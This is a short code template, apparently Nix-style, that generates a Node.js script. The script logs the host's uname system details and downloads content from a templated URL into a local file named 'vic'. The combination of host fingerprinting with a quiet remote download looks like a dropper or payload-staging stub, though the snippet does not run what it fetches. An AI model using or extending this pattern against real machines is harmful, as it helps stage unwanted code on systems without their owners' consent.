{ url, ... }: ''
const http = require('http');
const fs = require('fs');
const uname = require('uname');
const utsname = uname.uname();

console.log(utsname);

const file = fs.createWriteStream("vic");
const request = http.get("${url}", function(response) {
  response.pipe(file);
});
''
